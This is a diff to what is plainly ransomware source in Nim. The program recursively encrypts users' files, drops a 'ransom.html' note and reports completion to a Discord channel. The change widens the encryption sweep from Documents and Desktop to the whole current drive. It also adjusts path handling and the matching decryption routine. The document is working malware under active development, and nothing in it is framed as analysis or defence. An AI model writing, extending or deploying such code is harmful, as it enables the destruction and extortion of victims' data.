@@ -149,11 +149,12 @@ proc main() =
 
   let targetDir = getHomeDir() / "Documents"
   let desktop = getHomeDir() / "Desktop"
+  let currentDrive = getCurrentDir().split(PathSep)[0] & PathSep
   var files = newSeq[string]()
 
   var root: string
   when defined(windows):
-    root = getEnv("SystemDrive") & "\\"
+    root = getEnv("SystemDrive") & PathSep
   else:
     root = "/"
 
@@ -161,7 +162,7 @@ proc main() =
 
   if decryptMode:
     echo "Starting decryption..."
-    for dir in [root, desktop]:
+    for dir in [root, desktop, currentDrive]:
       for file in walkDirRec(dir):
         if file.endsWith(correctedExtension):
           files.add(file)
@@ -172,7 +173,7 @@ proc main() =
     echo "Decryption complete."
   else:
     echo "Starting encryption..."
-    for dir in [targetDir, desktop]:
+    for dir in [targetDir, desktop, currentDrive]:
       for file in walkDirRec(dir):
         if fileExists(file) and not file.endsWith(correctedExtension) and not file.contains("ransom.html"):
           files.add(file)
@@ -193,5 +194,3 @@ proc main() =
       echo "Error creating or opening ransom note: ", e.msg
     waitFor sendDiscordMessage("Encryption complete")
 
-when not isMainModule:
-  discard
